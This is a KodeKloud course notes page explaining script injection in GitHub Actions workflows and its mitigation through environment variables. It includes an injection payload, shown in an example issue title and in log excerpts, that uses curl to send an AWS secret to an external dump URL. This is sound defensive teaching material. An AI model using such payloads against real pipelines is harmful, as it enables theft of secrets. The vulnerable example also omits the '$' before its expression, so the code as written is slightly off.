# Mitigating Script Injection Attack - KodeKloud Notes

[Source URL](https://notes.kodekloud.com/docs/GitHub-Actions-Certification/Security-Guide/Mitigating-Script-Injection-Attack)

---

## Table of Contents

- Mitigating Script Injection Attack
  - Problem: Inline Script Injection
  - Exploit Demonstration
  - Solution: Use Environment Variables for Expressions
  - Demonstration of Safe Execution
  - Further Security Hardening
  - References
  - Watch Video

---

## Content

GitHub Actions Certification

Security Guide

# Mitigating Script Injection Attack

Protect your CI/CD pipelines by ensuring untrusted input cannot execute malicious commands or leak secrets. Inline scripts that interpolate user-controlled data directly in shell code are especially vulnerable.

## Problem: Inline Script Injection

A workflow that reads an issue title into a shell variable without sanitization allows an attacker to inject arbitrary commands:

```
name: Label Issues (Script Injection)
on:
  issues:
    types: [opened]


jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1
      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          issue_title="{{ github.event.issue.title }}"
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG..."
          else
            echo "Not a bug"
          fi
```

A malicious issue title such as:

```
bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY \
  https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
```

would run the `curl` command and expose your secret.

## Exploit Demonstration

1.  Open a new issue with the payload above.
2.  Check workflow logs:

```
Run if [[ "$issue_title" == *"bug"* ]]; then ...
shell: /usr/bin/bash -e {0}
env:
  AWS_SECRET_ACCESS_KEY: ***
  issue_title: bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY \
    https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
```

The injected `curl` runs before your conditional, leaking secrets.

## Solution: Use Environment Variables for Expressions

Store GitHub expressions in environment variables. Because Actions resolves `${{ }}` outside the shell, any injected payload remains inert.

```
name: Label Issues (Script Injection Mitigated)
on:
  issues:
    types: [opened]


jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1
      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          issue_title: '${{ github.event.issue.title }}'
        run: |
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG"
          else
            echo "Not a bug"
          fi
```

> [!important]
> **Note**
>
> Quoting the expression (`'${{ ... }}'`) ensures the shell sees it as a literal. Any embedded quotes or commands will not be evaluated.

| Approach                                   | Risk                                   | Mitigation                                             |
| ------------------------------------------ | -------------------------------------- | ------------------------------------------------------ |
| Inline interpolation in `run` script       | Arbitrary code execution, secret leaks | Use `env` variables with quoted `${{ }}` expressions   |
| Storing untrusted data in files or scripts | Payload injection at parse time        | Avoid inline scripts; prefer action inputs or env vars |

## Demonstration of Safe Execution

```
# Workflow environment shows the raw payload but does not execute it:
env:
  AWS_SECRET_ACCESS_KEY: ***
  issue_title: bug"; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY \
    https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2


# Execution output:
Issue is about a bug!
Assigning Label - BUG
```

Even though the payload appears in `issue_title`, the `curl` never executes. Your secret remains safe.

## Further Security Hardening

Go beyond input sanitization to fully secure your workflows:

- **Least Privilege**: Grant minimal permissions to tokens and service accounts.
- **Action Pinning**: Pin actions to specific versions or commit SHAs.
- **Third-Party Review**: Audit community actions before use.
- **Avoid Inline Scripts**: Use dedicated action steps or scripts in your repo.

> [!important]
> **Warning**
>
> Never expose secrets in logs or pass untrusted input to shell commands without sanitization.

## References

- [GitHub Actions Security Hardening](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Expressions](https://docs.github.com/actions/expressions)
- [Bash Reference Manual](https://www.gnu.org/software/bash/manual/)

> [!important]
> **## [Watch Video](https://learn.kodekloud.com/user/courses/github-actions-certification/module/a3e810f5-af92-4e1c-ac54-bdf50ddbe9cf/lesson/f2e8cafb-2cac-4747-90b0-f101c10cf961)**
>
> Watch video content
